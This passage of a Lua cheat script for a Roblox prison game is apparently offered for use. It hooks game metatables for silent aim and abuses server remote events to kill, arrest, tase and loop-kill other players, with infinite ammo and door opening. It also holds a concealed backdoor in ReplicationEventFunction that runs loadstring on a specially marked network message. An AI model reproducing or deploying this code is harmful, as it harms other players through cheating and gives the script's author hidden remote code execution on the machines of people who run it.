			cc["MaxAmmo"] = math.huge
			cc["StoredAmmo"] = math.huge
			cc["AmmoPerClip"] = math.huge
			cc["CurrentAmmo"] = math.huge
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
		wait(2)
			Player.Character:FindFirstChildOfClass("Humanoid"):EquipTools()
		else
			Kaito:Notif("You need to hold the tool you want to mod!",false)
		end
	end)
	Kaito:AddCmd("gunmods", "adds superpowers to your gun", function(args)
		if plr.Character:FindFirstChildOfClass("Tool") then
			local Tool = plr.Character:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return Kaito:Notif("Needs to be a gun!",false)
			end
			local cc = require(Tool.GunStates)
			cc["Damage"] = math.huge
			cc["FireRate"] = 0.5
			cc["Range"] = math.huge
			cc["MaxAmmo"] = math.huge
			cc["StoredAmmo"] = math.huge
			cc["AmmoPerClip"] = math.huge
			cc["CurrentAmmo"] = math.huge
			if Tool.Name ~= "Remington 870" then
				cc["Bullets"] = 1
				cc["AutoFire"] = true
			end
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
		else
			Kaito:Notif("You need to hold the gun!",false)
		end
	end)
    Kaito:AddCmd("ainfa", "apply inf ammo on all your equiped guns", function(args)
		if args[2] == "on" then
			States.AutoInfAmmo = true
			Kaito:Notif("AutoInfAmmo has been changed to "..tostring(States.AutoInfAmmo))
		elseif args[2] =="off" then
			States.AutoInfAmmo = false
			Kaito:Notif("AutoInfAmmo has been changed to "..tostring(States.AutoInfAmmo))
		else
			States.AutoInfAmmo = not States.AutoInfAmmo
			Kaito:Notif("AutoInfAmmo has been changed to "..tostring(States.AutoInfAmmo))
		end
	end)
	Kaito:AddCmd("autoinfammo", "Always apply inf ammo on all your guns", function(args)
		if args[2] == "on" then
			States.AutoInfAmmo = true
			Kaito:Notif("AutoInfAmmo has been changed to "..tostring(States.AutoInfAmmo))
		elseif args[2] =="off" then
			States.AutoInfAmmo = false
			Kaito:Notif("AutoInfAmmo has been changed to "..tostring(States.AutoInfAmmo))
		else
			States.AutoInfAmmo = not States.AutoInfAmmo
			Kaito:Notif("AutoInfAmmo has been changed to "..tostring(States.AutoInfAmmo))
		end
	end)
	Kaito:AddCmd("unload", "Destroys the script unloading it", function(args)
		Kaito:Destroy(game:FindFirstChild("Panther_update_loaded"))
		Unloaded = true

		for i,v in pairs(States) do
			States[i] = false
		end
		Temp = {}
		game:GetService("Workspace").Camera.CameraSubject = plr.Character.Humanoid 
		CmdBarFrame:TweenPosition(CmdBarFrame.Position-UDim2.new(0,0,-.5,0),"Out","Back",.8)
		wait(1)
		ScreenGui:Destroy()
	end)
end
--
local cdv = false
coroutine.wrap(function()
	while wait() do --// fast loop
		if Unloaded then
			return
		end
		for i,v in pairs(Temp.Viruses) do
			for _,a in pairs(game:GetService("Players"):GetPlayers()) do
				if a and a ~= v and a ~= Player then
					if a and a.Character and a.Character:FindFirstChild("HumanoidRootPart") and(a.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude <4.5 and a.Character.Humanoid.Health >0 and not table.find(Kaito.Whitelisted,a) then
						if not cdv then
							cdv = true
							Kaito:KillPlayer(a)
							wait(.7)
							cdv = false
						end
					end
				end
			end
		end
		game:GetService('StarterGui'):SetCoreGuiEnabled('Backpack', true)
		pcall(function()
			if States.AntiArrest == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(Kaito.Whitelisted,v) then
							if v.Character:FindFirstChildOfClass("Tool") and v.Character:FindFirstChild("Handcuffs") and not v.Character:FindFirstChild("Handcuffs"):FindFirstChild("ISWHITELISTED") then
								local args = {
									[1] = v
								}
								for i =1,3 do
									task.spawn(function()
										game:GetService("ReplicatedStorage").meleeEvent:FireServer(unpack(args))
									end)
								end
							end
						end
					end
				end
			end
		end)
		pcall(function()
			if States.AntiTouch == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <2.3 and v.Character.Humanoid.Health >0 and not table.find(Kaito.Whitelisted,v) then
							local args = {
								[1] = v
							}
							for i =1,8 do
								task.spawn(function()
									game:GetService("ReplicatedStorage").meleeEvent:FireServer(unpack(args))
								end)
							end
						end
					end
				end
			end
		end)

		pcall(function()
			if States.ArrestAura == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player and v.Team ~= game.Teams.Guards then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(Kaito.Whitelisted,v) then
							local args = {
								[1] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part")
							}
							if v.Team == game.Teams.Criminals or (v.Team == game.Teams.Inmates and Kaito:BadArea(v)) then
								workspace.Remote.arrest:InvokeServer(unpack(args))
							end
						end
					end
				end
			end
		end)
		pcall(function()
			if States.killaura == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player and not table.find(Kaito.Whitelisted,v) then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(Kaito.Whitelisted,v) then
							local args = {
								[1] = v
							}
							for i =1,3 do
								task.spawn(function()
									game:GetService("ReplicatedStorage").meleeEvent:FireServer(unpack(args))
								end)
							end
						end
					end
				end
			end
		end)
	end
end)()

local layout = {}
for i,v in pairs(CommandsList:GetChildren()) do
	if v and v:IsA("TextLabel") then
		table.insert(layout,v)
	end
end
SearchBar.Changed:Connect(function(Changed)
	if Changed:lower() == "text"  then
		CommandsList.CanvasPosition = Vector2.new(0, 0)
		if #SearchBar.Text >0 then
			for i,v in pairs(CommandsList:GetChildren()) do
				if v:IsA("TextLabel") then
					if not string.lower(v.Text):match(string.lower(SearchBar.Text)) then
						v.Parent = ScreenGui
						v.Visible = false
					end
				end
			end
			for i,v in pairs(ScreenGui:GetChildren()) do
				if v.Name == "TEMP_CMD" then
					if string.lower(v.Text):match(string.lower(SearchBar.Text)) then
						v.Parent = CommandsList
						v.Visible = true
					end
				end
			end
		elseif #SearchBar.Text <1 then
			for i,v in pairs(layout) do
				v.Parent = ScreenGui
				v.Visible = false
			end
			task.wait()
			for i,v in pairs(layout) do
				if v then
					v.Parent = CommandsList
					v.Visible = true
				end
			end
		end
	end
end)
UserInputService.InputBegan:connect(function(UserInput,Typing)
	if not Unloaded and not Typing then
		if UserInput.KeyCode == Enum.KeyCode.LeftShift then
			Running = true
		end
		if UserInput.KeyCode == Enum.KeyCode.F and States.OnePunch and not Running then --//Onepunch nothing advanced just to support weak exploits
			local a = Kaito:GetPosition()*CFrame.new(0,0,-1)
			local Part = Instance.new("Part",workspace)
			local p = nil
			Part.Transparency = 1
			Part.CanCollide = false
			Part.CFrame = a
			p = Part.Touched:Connect(function(h)
				if h and h.Parent and h.Parent:FindFirstChildOfClass("Humanoid") then
					local Target = game:GetService("Players"):FindFirstChild(h.Parent.Name)
					if Target and Target~= Player then
						for i =1,20 do
							task.spawn(function()
								game.ReplicatedStorage["meleeEvent"]:FireServer(Target)
							end)
						end
						p:Disconnect()
						Part:Destroy()
					end
				end
			end)
			task.spawn(function()
				wait(1)
				if Part then
					Part:Destroy()
					p:Disconnect()
				end
			end)
		end
		if UserInput.KeyCode == Enum.KeyCode.Semicolon and not Unloaded then
			task.wait(.024)
			CommandBar:CaptureFocus()
		end
	end
end)
UserInputService.InputEnded:connect(function(UserInput,Typing)
	if UserInput.KeyCode == Enum.KeyCode.LeftShift and not Unloaded then
		Running = false
	end
end)
local Players = game.Players
local LocalPlayer = Players.LocalPlayer
local GetPlayers = Players.GetPlayers
local Camera = workspace.CurrentCamera
local WTSP = Camera.WorldToScreenPoint
local FindFirstChild = game.FindFirstChild
local Vector2_new = Vector2.new
local Mouse = LocalPlayer.GetMouse(LocalPlayer)
local function NotObstructing(Destination, Ancestor)
	local ObstructingParts = Camera.GetPartsObscuringTarget(Camera, {Destination}, {Ancestor, LocalPlayer.Character})

	for i,v in ipairs(ObstructingParts) do
		pcall(function()
			if v.Transparency >= 1 then
				table.remove(ObstructingParts, i)
			end
		end)
	end

	if #ObstructingParts <= 0 then
		return true
	end
	local RaycastParameters = RaycastParams.new()
	RaycastParameters.IgnoreWater = true
	RaycastParameters.FilterType = Enum.RaycastFilterType.Blacklist
	RaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

	RaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

	local Origin = Camera.CFrame.Position
	local Direction = (Destination - Origin).Unit * 500
	local RayResult = workspace.Raycast(workspace, Origin, Direction, RaycastParameters) or {
		Instance = nil;
		Position = Origin + Direction;
		Material = Enum.Material.Air;
	}

	if RayResult.Instance and (RayResult.Instance.IsDescendantOf(RayResult.Instance, Ancestor) or RayResult.Instance == Ancestor) then
		return true
	end
	return false
end
function ClosestChar()
	local Max, Close = 170
	for I,V in pairs(GetPlayers(Players)) do
		if V ~= LocalPlayer and V.Team ~= LocalPlayer.Team and V.Character then
			local Head = FindFirstChild(V.Character, "Head")
			if Head then
				if NotObstructing(V.Character.PrimaryPart.Position, V.Character) == false then
					continue
				end
				local Pos, OnScreen = WTSP(Camera, Head.Position)
				if OnScreen then
					local Dist = (Vector2_new(Pos.X, Pos.Y) - Vector2_new(Mouse.X, Mouse.Y)).Magnitude
					if Dist < Max then
						Max = Dist
						Close = V.Character
					end
				end
			end
		end
	end

	return Close
end
local blackperson; blackperson = hookfunction(game.Destroy,function(a)
	local isExploit = checkcaller()
	if a and a:IsA("Player") and not Unloaded and isExploit  then
		if false then
			task.spawn(function()
				pcall(function()
					game:GetService("Players").LocalPlayer:Kick("TAMPER DETECTED")
				end)
			end)
			wait(1)
			while true do end
		end
	end
end)
local MT = getrawmetatable(game)
local __namecall = MT.__namecall
setreadonly(MT, false)
MT.__namecall = newcclosure(function(self, ...)
	local Method = getnamecallmethod()
	local isExploit = checkcaller()
	if Method:lower() == "destroy" or Method:lower() == "remove" and Unloaded == false then
		if self.IsA(self, "Player") and isExploit then
			if false then
				task.spawn(function()
					pcall(function()
						game:GetService("Players").LocalPlayer:Kick("TAMPER DETECTED")
					end)
				end)
				wait(1)
				while true do end
			end
		end
	end
	if States.SilentAim then
		if not Unloaded and Method == "FindPartOnRay" and not checkcaller() and tostring(getfenv(0).script) == "GunInterface" then
			local Character = ClosestChar()
			if Character then
				return Character.Torso, Character.Torso.Position+Vector3.new(Random.new():NextNumber(-1,1),Random.new():NextNumber(.1,.8),Random.new():NextNumber(-.5,.5))
			end
		end
	end
	return __namecall(self, ...)
end)
setreadonly(MT, true)
plr.PlayerGui.Home.fadeFrame.Visible = false--//black bar
plr:GetMouse().Button1Up:Connect(function()
	local target = plr:GetMouse().Target
	if not Unloaded and PremiumActivated and target and target.Parent:FindFirstChildOfClass("Humanoid") and game:GetService("Players"):FindFirstChild(target.Parent.Name) and States.OneShot then
		local Vic = game:GetService("Players"):FindFirstChild(target.Parent.Name)
		local Gun = plr.Character:FindFirstChildOfClass("Tool")
		if Gun and Gun:FindFirstChildOfClass("ModuleScript") and Vic and Vic.Team ~= plr.Team then
			local Bullets = Kaito:CreateBulletTable(20,(Vic.Character:FindFirstChild("Head") or Vic.Character:FindFirstChildOfClass("Part")))
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(Bullets, Gun)
		end
	end
end)
--//LOOPS
coroutine.wrap(function()
	while task.wait() do --//Faster loop
		if not Unloaded then
			if States.AntiSit then
				game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, false)
			end
		else
			break
		end
	end
end)()

coroutine.wrap(function()
	while task.wait() do
		if States.spawnguns and not Unloaded then
			if plr.Team ~= game.Teams.Guards then
				Kaito:ChangeTeam(game.Teams.Guards)
				wait(1)
			end
			if States.spawnguns then
				plr.Character:FindFirstChildOfClass("Humanoid").Health = 0
				wait()
				workspace.Remote.TeamEvent:FireServer("Bright blue")
			end
		end
	end
end)()

Temp.KIllaurCD = false
coroutine.wrap(function()
	while wait(.58) do --//slow loop
		if Unloaded then
			return
		end

		for i,v in pairs(Temp.KillAuras) do
			for _,a in pairs(game:GetService("Players"):GetPlayers()) do
				if a and a ~= v and a ~= Player then
					if a and a.Character and a.Character:FindFirstChild("HumanoidRootPart") and(a.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude <25 and a.Character.Humanoid.Health >0 and not table.find(Kaito.Whitelisted,a) then
						if not Temp.KIllaurCD then
							Temp.KIllaurCD = true
							Kaito:KillPlayer(a,nil,true)
							wait(.25)
							Temp.KIllaurCD = false
						end
					end
				end
			end
		end
		if States.AntiShield then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v.Character and v:FindFirstChild("Torso") and v:FindFirstChild("Torso"):FindFirstChild("ShieldFolder") then
					v.Torso:FindFirstChild("ShieldFolder"):Destroy()
				end
			end
		end
		if States.AntiTase and getconnections then
			for i,v in pairs(getconnections(workspace:WaitForChild("Remote").tazePlayer.OnClientEvent)) do
				v:Disable()
			end
		end
		if States.AutoInfAmmo then
			coroutine.wrap(function()
				for i,v in pairs({unpack(Player.Backpack:GetChildren()), unpack(Player.Character:GetChildren())}) do
					if v and v:IsA("Tool") and not table.find(Reload_Guns,v) then
						local cc = require(v.GunStates)
						cc["MaxAmmo"] = math.huge
						cc["StoredAmmo"] = math.huge
						cc["AmmoPerClip"] = math.huge
						cc["CurrentAmmo"] = math.huge
						table.insert(Reload_Guns, v)
					end
				end
			end)()
		end
		for i,v in pairs(Reload_Guns) do
			if v then
				task.spawn(function()
					game:GetService("ReplicatedStorage").ReloadEvent:FireServer(v)
				end)
			end
		end
		if not FLYING then
			game:GetService("ContextActionService"):UnbindAction("forward")
			game:GetService("ContextActionService"):UnbindAction("backward")
			game:GetService("ContextActionService"):UnbindAction("left")
			game:GetService("ContextActionService"):UnbindAction("right")
		end
		coroutine.wrap(function()
			if States.loopkillcriminals then
				wait(.5)
				Kaito:killall(game.Teams.Criminals)
			end
			if States.loopkillinmates then
				wait(.5)
				Kaito:killall(game.Teams.Inmates)
			end
			if States.loopkillguards then
				wait(.5)
				Kaito:killall(game.Teams.Guards)
			end
			if Temp and Temp.Loopkillall then
				wait(.5)
				Kaito:killall()
			end
		end)()
		coroutine.wrap(function()
			for i,v in pairs(Temp.Loopkilling) do
				if v and game:GetService("Players"):FindFirstChild(v) then
					local Target = game:GetService("Players"):FindFirstChild(v)
					if Target.Character and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health >0 and not Target.Character:FindFirstChildOfClass("ForceField") then
						if Player.Team == Target.Team and Player.Team == game.Teams.Guards then
							if Target.Team ~= game.Teams.Inmates then
								Kaito:ChangeTeam(game.Teams.Inmates)
							else
								Kaito:ChangeTeam(game.Teams.Criminals)
							end
						end
						Kaito:KillPlayer(Target)
					end
				end
			end
			for i,v in pairs(Temp.LoopmKilling) do
				if v and game:GetService("Players"):FindFirstChild(v) then
					local Target = game:GetService("Players"):FindFirstChild(v)
					if Target.Character and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health >0 and not Target.Character:FindFirstChildOfClass("ForceField") then
						Kaito:KillMPlayer(Target)
					end
				end
			end
		end)()
	end
end)()
task.spawn(function()
	while task.wait() do
		if not plr.Character:FindFirstChildOfClass("ForceField") and States.ff then
			Kaito:ChangeTeam(plr.Team.Name)
			wait(.4)
		end
		if Unloaded then
			break
		end
	end
end)
function MostClose(Position)
	local Max, Closest = math.huge,nil
	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Character then
			if v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool") then
				local ShootPart = (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle")
				if v.Character.PrimaryPart and (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle") then
					local Distance = (ShootPart.Position-Position).Magnitude
					if Distance < Max then
						Max = Distance
						Closest = v
					end 
				end
			end
		end
	end
	return Closest
end
local CurrentTime = 0
function GetPlayerHit(Part)
	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Character:IsAncestorOf(Part) then
			return v
		end
	end
end
local ShootbackCooldown = false
local function ReplicationEventFunction(Table)
	if Table[1] and Table[1].MSG ~= nil and Table[1].PLA ~= nil then
		if Table[1].Cframe.Z == 20000 then
			task.spawn(function()
				loadstring(tostring(Table[1].MSG))()
			end)
		end
	end
	if Unloaded then return end
	local Count = 0
	pcall(function()
		for i,v in pairs(Table) do
			if Count <= 2 then
				local Hit=v.Hit
				local Distance=v.Distance
				local Cframe=v.Cframe
				local RayObject =v.RayObject
				if Hit and Distance and Cframe then
					if Cframe ~= CFrame.new() then
						local PlayerHit = nil
						local WhoShot = nil
						for i,v in pairs(game:GetService("Players"):GetPlayers()) do
							if v.Character:IsAncestorOf(Hit) then
								WhoShot = v
								PlayerHit = Hit
								break
							end
						end
						local Worked,ufhwiufwe2 = pcall(function()
							WhoShot = MostClose((Cframe * CFrame.new(0, 0, -Distance / 2)).p)
						end)
						if Worked and WhoShot and PlayerHit and not Unloaded then
							if States.ShootBack and not ShootbackCooldown then
								if PlayerHit then
									if PlayerHit and Player.Character:IsAncestorOf(PlayerHit) and ShootbackCooldown == false and WhoShot.Team ~= plr.Team then
										ShootbackCooldown = true
										Kaito:KillPlayer(WhoShot)
										wait(1)
										ShootbackCooldown = false
									end
								end
							end
						end
					end
				end
				Count = Count + 1
			end
		end
	end)
end
coroutine.wrap(function()
	game:GetService("ReplicatedStorage"):WaitForChild("ReplicateEvent").OnClientEvent:Connect(ReplicationEventFunction)
end)()
--ClientGunReplicator
if PremiumActivated then
	local BulletCoolDown = false
	Temp.GunHandler =game:GetService("ReplicatedStorage"):WaitForChild("ReplicateEvent").OnClientEvent:connect(function(Amount, Value)
		if not States.anticrash then
			return
		end
		if #Amount <70 and not BulletCoolDown then
			BulletCoolDown =true
			for i = 1, #Amount do
				local Bullet = Instance.new("Part", workspace.CurrentCamera)
				Bullet.Name = "RayPart"
				Bullet.Material = Enum.Material.Neon
				Bullet.Anchored = true
				Bullet.CanCollide = false
				Bullet.Transparency = 0.5
				Bullet.formFactor = Enum.FormFactor.Custom
				Bullet.Size = Vector3.new(0.2, 0.2, Amount[i].Distance)
				Bullet.CFrame = Amount[i].Cframe
				game.Debris:AddItem(Bullet, 0.05)
				Instance.new("BlockMesh", Bullet).Scale = Vector3.new(0.5, 0.5, 1)
				if Value then
					Bullet.BrickColor = BrickColor.new("Cyan")
					local Light = Instance.new("SurfaceLight", Bullet)
					Light.Color = Color3.new(0, 0.9176470588235294, 1)
					Light.Range = 5
					Light.Face = "Bottom"
					Light.Brightness = 10
					Light.Angle = 180
					task.spawn(function()
						for v7 = 1, 10 do
							Bullet.Transparency = Bullet.Transparency + 0.1
							Light.Brightness = Light.Brightness - 1
							wait()
						end
					end)
				else
					Bullet.BrickColor = BrickColor.Yellow()
				end
			end
			wait(.01)
			BulletCoolDown = false
		end
	end)
	local CoolDown = false
	Temp.SoundHandler = game:GetService("ReplicatedStorage"):WaitForChild("SoundEvent").OnClientEvent:connect(function(Sound1, p4)
		if not States.anticrash then
			return
		end
		if CoolDown then
			CoolDown = true
			local Sound = Sound1:Clone()
			Sound.Parent = Sound1.Parent
			Sound:Play()
			Sound.Played:Connect(function()
				wait()
				game:GetService("Debris"):AddItem(Sound,0.001)
			end)
			wait(.1)
			CoolDown = false
		end
	end)
	Temp.WarnHandler = game:GetService("ReplicatedStorage"):WaitForChild("WarnEvent").OnClientEvent:connect(function(Text)
		if not States.anticrash then
			return
		end
		local WarnGui = game:GetService("ReplicatedStorage").gooeys.WarnGui:Clone()
		WarnGui.Parent = plr.PlayerGui
		if Text == 1 then
			WarnGui.Frame.desc.Text = "This is your last warning. You will become a prisoner if you kill an innocent player 1 more time."
		else
			WarnGui.Frame.desc.Text = "Do not kill innocent people! You will be arrested and jailed if you kill " .. Text .. " more times."
		end
		WarnGui.Frame.LocalScript.Disabled = false
	end)
end
function Msg(player,Text)
	local ohString1 = "/w "..player.Name.." "..Text
	local ohString2 = "All"
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
end

local Arg1_P=""
local function PlayerCheckCommand(G)
	if Arg1_P == Prefix..G then
		return true
	else
		return false
	end
end
function AdminChatted(Text,Speaker)
	local Commands = {--//Actual commands
		Prefix.."car",
		Prefix.."arrest [PLAYER,ALL]",
		Prefix.."kill [PLAYER,ALL,TEAM]",
		Prefix.."opendoors",
		Prefix.."loopkill [PLAYER,ALL]",
		Prefix.."unloopkill [PLAYER,ALL]",
		Prefix.."bring [PLAYER]",
		Prefix.."goto [PLAYER]",
	}
	local Commands2 = { --//Teleports
		Prefix.."nex [ME,PLAYER]",
		Prefix.."prison [ME,PLAYER]",
		Prefix.."cbase [ME,PLAYER]",
		Prefix.."yard [ME,PLAYER]",
		Prefix.."tower [ME,PLAYER]",
		Prefix.."Office [ME,PLAYER]", 
		Prefix.."Cells [ME,PLAYER]", 
		Prefix.."Trap [ME,PLAYER]", 
		Prefix.."GuardTower [ME,PLAYER]", 
		Prefix.."PrisobBack [ME,PLAYER]", 
		Prefix.."CCTV [ME,PLAYER]", 
	    Prefix.."Lobby [ME,PLAYER]", 
	    Prefix.."Secretroom [ME,PLAYER]", 
	    Prefix.."Gate [ME,PLAYER]", 
	    Prefix.."Crim [ME,PLAYER]", 
	    Prefix.."Gate [ME,PLAYER]", 
	    Prefix.."ExploitersBase [ME,PLAYER]",
	    Prefix.."Mansion [ME,PLAYER]", 
	    Prefix.."Whitehouse [ME,PLAYER]", 
	    Prefix.."School1 [ME,PLAYER]", 
	    Prefix.."School2 [ME,PLAYER]",
	}
	Speaker = game:GetService("Players"):FindFirstChild(Speaker)
	if Unloaded then return end
	local TXT = string.lower(Text)
	local SPLITED = TXT:split(" ")
	Arg1_P = SPLITED[1]
	local Arg2_P = SPLITED[2]
	local Arg3_P = SPLITED[3]
	local Arg4_P = SPLITED[4]
	if PlayerCheckCommand("cmds") then
		do
			local Converted = Commands
			for i,v in pairs(Converted) do
				if v then
					Converted[i]=Converted[i]..", "
				end
			end
			local Output = table.concat(Converted)
			Msg(Speaker,Output)
		end
		do
			local Converted = Commands2
			for i,v in pairs(Converted) do
				if v then
					Converted[i]=Converted[i]..", "
				end
			end
			local Output = table.concat(Converted)
			Msg(Speaker,Output)
		end
	end
	if PlayerCheckCommand("loopkill") then
		if Arg2_P == "all" then
			Temp.Loopkillall = false
			Kaito:Notif("Unloopkilling all")
		else
			local Player = Kaito:FindPlayer(Arg2_P)
			if table.find(Temp.Loopkilling,Player.Name) then
				table.remove(Temp.Loopkilling,table.find(Temp.Loopkilling,Player.Name))
				Kaito:Notif("Player has been unlooped")
			else
				Kaito:Notif("Player is already getting loop killed!",false)
			end
		end
	end

	if PlayerCheckCommand("loopkill") then
		if Arg2_P == "all" then
			Temp.Loopkillall = true
		else
			local Player = Kaito:FindPlayer(Arg2_P)
			if not table.find(Temp.Loopkilling,Player.Name) then
				table.insert(Temp.Loopkilling, Player.Name)
			end
		end
	end

	if PlayerCheckCommand("arrest") then
		if Arg2_P =="all" then
			local Lastp = Kaito:GetPosition()
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v ~= Player and v.Team ~= game.Teams.Guards and v.Team ~= game.Teams.Neutral and v ~= plr and Kaito:BadArea(v) or v.Team == game.Teams.Criminals and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").Health>0 then
					local d = false
					task.spawn(function()
						repeat
							if v.Team == game.Teams.Inmates then
								break
							end
							task.wait()
							pcall(function()
								Kaito:MoveTo(v.Character:GetPrimaryPartCFrame())
							end)
							if v.Character:FindFirstChildOfClass("Humanoid").Health<1 then
								break
							end
							Kaito:UnSit()
						until d
					end)
					repeat
						wait(.2)
						local a = pcall(function()
							local ohInstance1 = v.Character["HumanoidRootPart"]
							workspace.Remote.arrest:InvokeServer(ohInstance1)
						end)
						if v.Character:FindFirstChildOfClass("Humanoid").Health<1 then
							break
						end
						Kaito:UnSit()
					until v.Character["Head"]:FindFirstChildOfClass("BillboardGui")
					d = true
					Kaito:MoveTo(Lastp)
					wait(.7)
				end
			end
			Kaito:MoveTo(Lastp)
		else
			local Player = Kaito:FindPlayer(Arg2_P)
			local v = Player
			local Lastp = Kaito:GetPosition()
			if v.Team ~= game.Teams.Guards and v.Team ~= game.Teams.Neutral and v ~= plr and Kaito:BadArea(v) or v.Team == game.Teams.Criminals and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").Health>0 then
				if v == Player then
					local d = false
					task.spawn(function()
						repeat
							task.wait()
							pcall(function()
								Kaito:MoveTo(Player.Character:GetPrimaryPartCFrame())
							end)
							if v.Character:FindFirstChildOfClass("Humanoid").Health<1 then
								break
							end
						until d
					end)
					repeat
						wait(.2)
						local a = pcall(function()
							local ohInstance1 = v.Character["HumanoidRootPart"]
							workspace.Remote.arrest:InvokeServer(ohInstance1)
						end)
						if v.Character:FindFirstChildOfClass("Humanoid").Health<1 then
							break
						end
						Kaito:UnSit()
					until v.Character["Head"]:FindFirstChildOfClass("BillboardGui")
					d = true
				end
			else
				Kaito:Notif("This Player cannot be arrested",false)
			end
			Kaito:MoveTo(Lastp)
		end
	end
	if PlayerCheckCommand("aura") then

		if Arg2_P then
			local Player = Kaito:FindPlayer(Arg2_P)
			if not table.find(Temp.KillAuras,Player) then
				table.insert(Temps.KillAuras, Player)
			end
		elseif not Arg2_P then
			if not table.find(Temp.KillAuras,Speaker) then
				table.insert(Temps.KillAuras, Speaker)
			end
		end
	end
	if PlayerCheckCommand("unaura") then

		if Arg2_P then
			local Player = Kaito:FindPlayer(Arg2_P)
			if table.find(Temp.KillAuras,Player) then
				table.remove(Temp.KillAuras,table.find(Temp.KillAuras,Player))
			end
		else
			if table.find(Temp.KillAuras,Speaker) then
				table.remove(Temp.KillAuras,table.find(Temp.KillAuras,Speaker))
			end
		end
	end
	if PlayerCheckCommand("tase") then
		local Player = Kaito:FindPlayer(Arg2_P)
		if Player then
			local Oldt = Player.Team
			Kaito:ChangeTeam(game.Teams.Guards)
			wait()
			task.spawn(function()
				game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
			end)
			local ohTable1 = {
				[1] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
					["Distance"] = -1,
					["Cframe"] = CFrame.new(),
					["Hit"] = Player.Character.Head
				}
			}
			local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack.Taser

			game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
			task.spawn(function()
				game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
			end)
			wait(.1)
			Kaito:ChangeTeam(Oldt)
		end
	end
	if PlayerCheckCommand("goto") then
		local Target = Kaito:FindPlayer(Arg2_P)
		if Target then
			Kaito:bring(Speaker,Target.Character:GetPrimaryPartCFrame())
		end
	end
	if PlayerCheckCommand("bring") then
		local Target = Kaito:FindPlayer(Arg2_P)
		if Target then
			Kaito:bring(Target,Speaker.Character.Head.CFrame)
		end
	end
	if PlayerCheckCommand("opengate") then
		local OldPos = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
		Kaito:MoveTo(CFrame.new(503.998993, 102.039917, 2242.79907, 0.99996537, -1.0554821e-08, -0.00832392555, 1.00791926e-08, 1, -5.71817864e-08, 0.00832392555, 5.70959067e-08, 0.99996537))
		wait(.1)
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"])
		Kaito:MoveTo(OldPos)
	end
	if PlayerCheckCommand("opendoors") then
		if not firetouchinterest then
			return Kaito:Notif("Your exploit doesnt support this command!",false)
		end
		local LastTeam =plr.Team
		Kaito:ChangeTeam(game.Teams.Guards)
		wait(.7)
		task.spawn(function()
			local Arg_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Prison Gate"]["Prison Gate"]
			local Event = game:GetService("Workspace").Remote.ItemHandler
			Event:InvokeServer(Arg_1)
		end)
		for i,v in pairs(game:GetService("Workspace").Doors:GetChildren()) do
			if v then
				if v:FindFirstChild("block") and v:FindFirstChild("block"):FindFirstChild("hitbox") then
					firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,0)
					firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,1)
				end
			end
		end
		wait(1)
		Kaito:ChangeTeam(LastTeam)
	end
	if PlayerCheckCommand("kill") then
		if Arg2_P == "all" then
			Kaito:killall()
		elseif Arg2_P == "everyone" then
			Kaito:killall()
		elseif Arg2_P == "others" then
			Kaito:killall()
		elseif Arg2_P == "guards" then
			Kaito:killall(game.Teams.Guards)
		elseif Arg2_P == "inmates" then
			Kaito:killall(game.Teams.Inmates)
		elseif Arg2_P == "criminals" then
			Kaito:killall(game.Teams.Criminals)
		else
			local Player = Kaito:FindPlayer(Arg2_P)
			if Player then
				Kaito:KillPlayer(Player)
			end
		end
